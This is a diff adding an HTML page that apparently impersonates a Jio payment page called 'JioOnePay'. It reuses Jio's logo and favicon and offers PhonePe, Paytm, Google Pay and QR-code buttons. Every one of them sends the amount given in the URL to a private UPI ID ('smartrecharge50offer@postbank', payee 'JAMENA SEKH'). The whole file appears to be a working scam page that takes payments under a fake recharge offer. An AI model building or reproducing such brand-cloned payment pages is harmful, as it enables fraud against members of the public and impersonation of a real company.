@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>JioOnePay</title>
+    <!-- Favicon -->
+    <link rel="icon" href="https://www.jio.com/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            color: #333;
+            -webkit-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .header {
+            background-color: #fff;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            margin-bottom: 10px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .menu-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 15px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            width: 24px;
+            height: 2px;
+            background-color: #333;
+            margin-bottom: 5px;
+            border-radius: 1px;
+        }
+        .menu-icon span:last-child {
+            margin-bottom: 0;
+        }
+
+        .jio-logo-container {
+            display: flex;
+            align-items: center;
+            gap: 8px; /* Space between logo and text */
+        }
+        .jio-logo-container img {
+            height: 28px;
+            width: auto;
+            vertical-align: middle;
+        }
+        .jioonepay-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff; /* Red color for JioOnePay */
+        }
+
+        .header-right {
+            width: 36px;
+            height: 36px;
+            background-color: #e0e0e0;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        .header-right svg {
+            fill: #1a73e8; /* User icon color */
+            width: 24px;
+            height: 24px;
+        }
+
+        .amount-section {
+            background-color: #fff;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+        }
+
+        .amount-text {
+            font-size: 18px;
+            font-weight: 500;
+            color: #555;
+        }
+
+        .amount-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+        }
+
+        .payment-option-card {
+            background-color: #fff;
+            margin: 10px 15px;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+            overflow: hidden;
+        }
+
+        .option-item {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+            cursor: pointer;
+            position: relative;
+            text-decoration: none; /* For anchor tags */
+            color: inherit; /* For anchor tags */
+        }
+        .option-item:last-child {
+            border-bottom: none;
+        }
+        .option-item:active {
+            background-color: #f5f5f5;
+        }
+
+        .option-icon {
+            width: 36px;
+            height: 36px;
+            margin-right: 15px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f2f5;
+            overflow: hidden;
+        }
+        .option-icon img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: contain;
+        }
+        .option-icon.phonepe { background-color: #6739B7; }
+        .option-icon.paytm { background-color: #00B9F1; } /* Paytm usually has blue-ish background */
+        .option-icon.googlepay { background-color: #fff; border: 1px solid #eee; }
+        .option-icon.upi-generic { background-color: #EBF3FF; }
+        .option-icon.qrcode { background-color: #E8F5E9; }
+
+        .option-text {
+            flex-grow: 1;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .arrow-icon {
+            width: 12px;
+            height: 12px;
+            margin-left: 10px;
+            border-top: 2px solid #999;
+            border-right: 2px solid #999;
+            transform: rotate(45deg);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #777;
+        }
+        .footer strong {
+            font-weight: 700;
+            color: #e71111;
+        }
+
+        /* QR Code Section Styles */
+        #qrCodeSection {
+            background-color: #fff;
+            margin: 10px 15px;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+            padding: 20px;
+            text-align: center;
+            display: none; /* Hidden by default */
+        }
+        #qrCodeCanvas {
+            display: block;
+            margin: 15px auto;
+            height: 200px;
+            width: 200px;
+            border: 1px solid #eee;
+            border-radius: 8px;
+        }
+        #qrCodeSection p {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 10px;
+        }
+        .qr-amount-display {
+            font-weight: bold;
+            color: #000;
+            margin-top: 5px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="header-left">
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="jio-logo-container">
+                <img src="https://myjiostatic.cdn.jio.com/jiocom/static/images/500-desktop.svg" alt="My Jio Logo">
+                <span class="jioonepay-text">JioOnePay</span>
+            </div>
+        </div>
+        <div class="header-right">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M16 6a4 4 0 11-8 0 4 4 0 018 0zm4 10.5c0 3.038-3.582 5.5-8 5.5s-8-2.462-8-5.5S7.582 11 12 11s8 2.462 8 5.5z" fill="currentColor"></path>
+            </svg>
+        </div>
+    </div>
+
+    <div class="amount-section">
+        <span class="amount-text">Amount payable:</span>
+        <span class="amount-value" id="amountPayable">₹0.00</span>
+    </div>
+
+    <div class="payment-option-card">
+        <a href="#" class="option-item" id="phonepe-option">
+            <div class="option-icon phonepe">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2DlG6ujRgP5K1w1FNeUz3jUiAGLrRzrbhu_hL-cEoOWcFPUAmAptMPA&amp;s=10" alt="PhonePe Logo">
+            </div>
+            <span class="option-text">PhonePe</span>
+            <div class="arrow-icon"></div>
+        </a>
+        <a href="#" class="option-item" id="paytm-option">
+            <div class="option-icon paytm">
+                <img src="https://lh3.googleusercontent.com/bJZifQXgUTjdpawYz-cIjj5WHLSijgbLpxAhKg9nRB_73R8ZOdaJE9Bcb3gxk98-kPaBoO_I=w46-h46-c0x00ffffff-rj" alt="Paytm Logo">
+            </div>
+            <span class="option-text">Paytm</span>
+            <div class="arrow-icon"></div>
+        </a>
+        <a href="#" class="option-item" id="googlepay-option">
+            <div class="option-icon googlepay">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnktVGHQGmjG9JLRGB-fSyDtC6SkxPDoPldx2_pL2w5wXaMC2GkRLZcKOvXzznjsd7TvXuCSrYCQPFGsZ-r0_F2M1UQL0GtErL2AJnaSQY" alt="Google Pay Logo">
+            </div>
+            <span class="option-text">Google Pay</span>
+            <div class="arrow-icon"></div>
+        </a>
+    </div>
+
+    <div class="payment-option-card">
+        <a href="#" class="option-item" id="other-upi-apps-option">
+            <div class="option-icon upi-generic">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M15.5 9a1 1 0 00-1-1h-5a1 1 0 000 2h2a1 1 0 110 2h-1a1 1 0 00-.45 1.89l4 2a.931.931 0 00.45.11 1 1 0 00.89-.55 1 1 0 00-.39-1.34l-1.56-.78a3 3 0 00.88-3.33h.18a1 1 0 001-1zM12 2A10 10 0 002 12c-.002.374.021.749.07 1.12a1.007 1.007 0 002-.24A8.493 8.493 0 014 12a8 8 0 112.73 6h.77a1 1 0 000-2h-3a1 1 0 00-1 1v3a1 1 0 002 0v-.43A10 10 0 1012 2z" fill="currentColor"></path>
+                </svg>
+            </div>
+            <span class="option-text">Pay via other UPI app</span>
+            <div class="arrow-icon"></div>
+        </a>
+    </div>
+
+    <div class="payment-option-card">
+        <a href="#" class="option-item" id="qr-code-option">
+            <div class="option-icon qrcode">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M3 11H5V13H3V11ZM11 11H13V13H11V11ZM17 11H19V13H17V11ZM3 15H5V17H3V15ZM7 15H9V17H7V15ZM11 15H13V17H11V15ZM15 15H17V17H15V15ZM3 19H5V21H3V19ZM7 19H9V21H7V19ZM11 19H13V21H11V19ZM15 19H17V21H15V19ZM19 19H21V21H19V19ZM19 3H21V5H19V3ZM19 7H21V9H19V7ZM19 11H21V13H19V11ZM19 15H21V17H19V15ZM15 3H17V5H15V3ZM15 7H17V9H15V7ZM15 11H17V13H15V11ZM11 3H13V5H11V3ZM11 7H13V9H11V7ZM11 11H13V13H11V11ZM7 3H9V5H7V3ZM7 7H9V9H7V7ZM7 11H9V13H7V11ZM3 3H5V5H3V3ZM3 7H5V9H3V7ZM3 11H5V13H3V11Z" fill="#28A745"/>
+                </svg>
+            </div>
+            <span class="option-text">Pay via QR Code</span>
+            <div class="arrow-icon"></div>
+        </a>
+    </div>
+
+    <div id="qrCodeSection">
+        <p>Scan this QR code with any UPI app</p>
+        <canvas id="qrCodeCanvas"></canvas>
+        <span class="qr-amount-display" id="qrAmountDisplay">Amount: ₹0.00</span>
+    </div>
+
+    <div class="footer">
+        powered by <strong style="color: #e71111;">JioOnePay</strong>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const upiId = 'smartrecharge50offer@postbank';
+            const defaultAmount = '0.00';
+            const defaultRemark = 'JioOnePay'; // Default remark/coupon
+
+            // Function to parse URL parameters
+            function getUrlParams() {
+                const params = new URLSearchParams(window.location.search);
+                return {
+                    amount: params.get('amount'), // Get 'amount' from URL
+                    remark: params.get('remark')  // Get 'remark' (coupon) from URL
+                };
+            }
+
+            const urlParams = getUrlParams();
+            const currentAmount = urlParams.amount ? parseFloat(urlParams.amount).toFixed(2) : parseFloat(defaultAmount).toFixed(2);
+            const currentRemark = urlParams.remark || defaultRemark;
+
+            // Update Amount payable display
+            document.getElementById('amountPayable').textContent = `₹${currentAmount}`;
+            // Update QR code section amount display
+            document.getElementById('qrAmountDisplay').textContent = `Amount: ₹${currentAmount}`;
+
+            // Generate UPI links with dynamic data
+            function generateUpiLink(scheme) {
+                // Ensure remark is properly URL-encoded
+                const encodedRemark = encodeURIComponent(currentRemark);
+                const base = `pa=${upiId}&pn=JAMENA%20SEKH&tn=${encodedRemark}&am=${currentAmount}&cu=INR`;
+                
+                // Specific scheme handling if needed (e.g., Google Pay uses 'tez')
+                if (scheme === 'tez') {
+                    return `tez://upi/pay?${base}`;
+                } else {
+                    return `${scheme}://upi/pay?${base}`;
+                }
+            }
+
+            const links = {
+                phonepe: generateUpiLink('phonepe'),
+                paytm: generateUpiLink('paytm'),
+                googlepay: generateUpiLink('tez'), 
+                allUpi: generateUpiLink('upi'), // Generic UPI for other apps
+            };
+
+            // Event Listeners for direct app options
+            document.getElementById('phonepe-option').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = links.phonepe;
+            });
+
+            document.getElementById('paytm-option').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = links.paytm;
+            });
+
+            document.getElementById('googlepay-option').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = links.googlepay;
+            });
+
+            document.getElementById('other-upi-apps-option').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = links.allUpi;
+            });
+
+            // QR Code generation and display
+            const qrCodeSection = document.getElementById('qrCodeSection');
+            document.getElementById('qr-code-option').addEventListener('click', function(e) {
+                e.preventDefault();
+                // Toggle visibility
+                if (qrCodeSection.style.display === 'none' || qrCodeSection.style.display === '') {
+                    qrCodeSection.style.display = 'block';
+                    generateQRCode(); // Generate QR when shown
+                } else {
+                    qrCodeSection.style.display = 'none';
+                }
+            });
+
+            function generateQRCode() {
+                const upiQrData = links.allUpi; // Use the generic UPI link for QR
+                QRCode.toCanvas(document.getElementById('qrCodeCanvas'), upiQrData, {
+                    width: 200,
+                    height: 200,
+                    margin: 1,
+                    color: {
+                        dark: '#000000',
+                        light: '#FFFFFF'
+                    }
+                }, function(error) {
+                    if (error) console.error(error);
+                    console.log('QR Code generated successfully!');
+                });
+            }
+
+            // Back icon functionality (if needed)
+            document.querySelector('.menu-icon').addEventListener('click', function() {
+                alert('Menu/Back icon clicked!');
+            });
+        });
+    </script>
+</body>
+</html>
